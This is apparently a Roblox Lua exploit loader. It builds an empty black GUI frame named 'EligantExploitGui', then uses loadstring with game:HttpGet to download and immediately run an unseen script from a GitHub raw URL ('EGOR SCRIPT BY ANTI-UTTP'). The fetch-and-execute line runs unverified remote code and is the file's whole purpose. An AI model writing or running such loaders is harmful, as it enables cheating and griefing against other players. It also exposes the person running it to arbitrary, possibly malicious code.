local player = game:GetService("Players").LocalPlayer
local TweenService = game:GetService("TweenService")

local gui = Instance.new("ScreenGui")
gui.Name = "EligantExploitGui"
gui.Parent = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 200)
frame.Position = UDim2.new(0.5, -175, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = gui


loadstring(game:HttpGet("https://raw.githubusercontent.com/DROID-cell-sys/ANTI-UTTP-SCRIPTT/refs/heads/main/EGOR%20SCRIPT%20BY%20ANTI-UTTP"))()


